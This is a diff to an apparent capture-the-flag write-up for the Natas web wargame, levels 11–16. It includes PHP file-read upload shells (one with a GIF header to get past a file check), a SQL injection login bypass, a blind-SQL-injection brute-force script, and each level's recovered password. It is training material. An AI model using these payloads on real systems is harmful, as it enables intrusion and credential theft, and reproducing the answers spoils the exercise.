@@ -201,7 +201,97 @@ if($key != "") {
 </details>
 
 <details open>
-<summary>Level 10 - > Level 11</summary>
+<summary>Level 11 - > Level 12</summary>
+
+```
+document.cookie = "data=MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz";
+
+The password for natas12 is YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
+```
+
+</details>
+
+<details open>
+<summary>Level 12 - > Level 13</summary>
+
+```
+<?php
+    $myfile = fopen("/etc/natas_webpass/natas13", "r") or die("Unable to open file!");
+    echo fread($myfile,filesize("/etc/natas_webpass/natas13"));
+    fclose($myfile);
+?>
+
+lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
+```
+
+</details>
+
+<details open>
+<summary>Level 13 - > Level 14</summary>
+
+```
+GIF98a
+<?php
+    $myfile = fopen("/etc/natas_webpass/natas13", "r") or die("Unable to open file!");
+    echo fread($myfile,filesize("/etc/natas_webpass/natas13"));
+    fclose($myfile);
+?>
+
+
+qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
+```
+
+</details>
+
+<details open>
+<summary>Level 14 - > Level 15</summary>
+
+```
+username = " or 1 = 1 #
+
+Successful login! The password for natas15 is TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
+```
+
+</details>
+
+<details open>
+<summary>Level 15 - > Level 16</summary>
+
+```
+#!/usr/bin/env python3
+import requests
+
+url = 'http://natas15.natas.labs.overthewire.org/index.php'
+username = 'natas15'
+password = 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'
+key = ""
+
+for pos in range(1,33):
+    low = 32
+    high = 126
+    mid = (high + low) >> 1
+
+    while mid < high:
+        # print low,mid,high
+        payload = "natas16\" and %d < ascii(mid(password,%d,1)) and \"\" like \"" % (mid, pos)
+        req = requests.post(url, auth=requests.auth.HTTPBasicAuth(username, password), data={"username": payload})
+        # print req.text
+        if req.text.find("doesn't exist") == -1:
+            low = mid + 1
+        else:
+            high = mid
+        mid = (high + low) >> 1
+
+    key += chr(mid)
+    print(key)
+
+TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
+```
+
+</details>
+
+<details open>
+<summary>Level 16 - > Level 17</summary>
 
 ```
 
